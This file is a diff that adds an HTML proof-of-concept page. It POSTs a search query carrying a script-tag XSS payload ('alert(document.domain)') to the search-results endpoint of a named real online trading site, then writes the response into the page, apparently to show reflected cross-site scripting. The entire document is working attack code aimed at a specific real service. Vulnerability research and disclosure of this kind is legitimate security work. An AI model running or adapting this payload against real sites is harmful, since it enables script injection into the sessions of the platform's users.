@@ -1,0 +1,21 @@
+<html>
+  <body>
+    <script>
+      fetch("https://www.nabtrade.com.au/search/search-results", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          "Profile": "nabtrade",
+          "Query": "<script>alert(document.domain)</script>",
+          "advancedQuery": "",
+          "page": 1,
+          "pageSize": 10
+        })
+      })
+      .then(res => res.text())
+      .then(res => document.write(res));
+    </script>
+  </body>
+</html>
